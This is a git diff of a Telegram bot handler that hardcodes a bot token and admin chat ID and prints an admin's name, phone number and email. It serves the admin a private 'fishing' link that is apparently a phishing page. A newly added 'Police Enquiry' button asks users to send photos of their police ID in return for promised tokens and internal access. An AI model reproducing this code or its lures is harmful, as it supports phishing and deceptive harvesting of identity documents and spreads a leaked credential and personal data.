@@ -1,8 +1,8 @@
-// api/bot.js
+// /api/bot.js
 
 const TELEGRAM_BOT_TOKEN = '7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY';
-const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 const ADMIN_CHAT_ID = '7216371031';
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 export default async function handler(req, res) {
   console.log('📩 Incoming Telegram webhook:', JSON.stringify(req.body, null, 2));
@@ -18,47 +18,32 @@ export default async function handler(req, res) {
   const callbackQuery = body.callback_query;
 
   try {
-    // Handle /start
+    // /start command
     if (text === '/start') {
       await sendWelcomeWithButtons(chatId);
     }
 
-    // Handle inline button clicks
+    // Handle button callbacks
     if (callbackQuery) {
       const data = callbackQuery.data;
       const fromChatId = message.chat.id;
       const isAdmin = fromChatId.toString() === ADMIN_CHAT_ID;
 
       if (data === 'details') {
-        if (isAdmin) {
-          await sendMessage(fromChatId,
-`👑 *Admin Details*
-Name: Muhammed Rishad AJ
-Phone: 91857088697
-Email: muhammedrishadaj\\@yahoo\\.com
-Telegram: @mohdrishad
-Instagram: [@r1shaad\\_\\_](https://instagram\\.com/r1shaad__)`);
-        } else {
-          await sendMessage(fromChatId,
-`👤 *Admin Info*
-Name: Muhammed Rishad AJ
-Phone: xxx\\-xxx\\-xxxx
-Email: muhammedrishadaj\\@yahoo\\.com
-Telegram: @mohdrishad
-Instagram: @r1shaad__`);
-        }
-      }
+        const adminMessage = isAdmin
+          ? `👑 *Admin Details*\nName: Muhammed Rishad AJ\nPhone: 91857088697\nEmail: muhammedrishadaj\\@yahoo\\.com\nTelegram: @mohdrishad\nInstagram: [@r1shaad\\_\\_](https://instagram.com/r1shaad__)`
+          : `👤 *Admin Info*\nName: Muhammed Rishad AJ\nPhone: xxx\\-xxx\\-xxxx\nEmail: muhammedrishadaj\\@yahoo\\.com\nTelegram: @mohdrishad\nInstagram: @r1shaad\\_\\_`;
 
-      else if (data === 'fishing') {
-        if (isAdmin) {
-          await sendMessage(fromChatId,
-`🎣 *Fishing Link \\(Private\\)*
-🔗 ||https://heavenscake\\.vercel\\.app/page\\.html||`);
-        } else {
-          await sendMessage(fromChatId,
-`🚫 *This feature is for admins only.*
-For enquiries, contact: @mohdrishad`);
-        }
+        await sendMessage(fromChatId, adminMessage);
+      } else if (data === 'fishing') {
+        const fishingMessage = isAdmin
+          ? `🎣 *Fishing Link (Private)*\n🔗 ||https://heavenscake.vercel.app/page.html||`
+          : `🚫 *This feature is for admins only.*\nFor enquiries, contact: @mohdrishad`;
+
+        await sendMessage(fromChatId, fishingMessage);
+      } else if (data === 'police') {
+        await sendMessage(fromChatId,
+          `🛂 *Police Verification Required*\n\nTo access confidential bot and admin details, please:\n\n1\\. 📸 Send a clear photo of your *Police ID*\n2\\. ✅ Wait for our admin to manually verify you\n\nOnce verified, you will receive:\n\n- 👤 Admin full name\n- 🎂 Date of Birth\n- 📞 Phone & WhatsApp number\n- 📧 Email address\n- 🤖 Bot command scripts\n- 🔐 API token & integrations\n- 🧰 Internal access features\n\n*Please note:* This is a secure process\\. Misuse or false identification will result in permanent ban\\.`);
       }
 
       await answerCallback(callbackQuery.id);
@@ -71,28 +56,26 @@ For enquiries, contact: @mohdrishad`);
   }
 }
 
-// Show /start menu with buttons
+// 🔘 Welcome message with buttons
 async function sendWelcomeWithButtons(chatId) {
   const payload = {
     chat_id: chatId,
-    text: `👋 Welcome to Tecky Rishad Bot!\n\nChoose an option below:`,
+    text: `👋 Welcome to *Tecky Rishad Bot*\\!\n\nChoose an option below:`,
+    parse_mode: 'MarkdownV2',
     reply_markup: {
       inline_keyboard: [
         [
           {
-            text: '🔗 Get my Instagram',
-            url: 'https://instagram.com/r1shaad__',
+            text: '✨ Join Our Community',
+            url: 'https://t.me/r1shaad'
           }
         ],
         [
-          {
-            text: '👤 Admin Details',
-            callback_data: 'details'
-          },
-          {
-            text: '🎣 Let’s Fish',
-            callback_data: 'fishing'
-          }
+          { text: '👤 Admin Details', callback_data: 'details' },
+          { text: '🎣 Let’s Fish', callback_data: 'fishing' }
+        ],
+        [
+          { text: '🚨 Police Enquiry', callback_data: 'police' }
         ]
       ]
     }
@@ -105,7 +88,7 @@ async function sendWelcomeWithButtons(chatId) {
   });
 }
 
-// Send MarkdownV2-safe message
+// 📨 Send a message using MarkdownV2
 async function sendMessage(chatId, message) {
   return fetch(`${TELEGRAM_API_URL}/sendMessage`, {
     method: 'POST',
@@ -118,7 +101,7 @@ async function sendMessage(chatId, message) {
   });
 }
 
-// Acknowledge button click
+// ✅ Answer the callback to remove loading spinner
 async function answerCallback(callbackQueryId) {
   return fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
     method: 'POST',
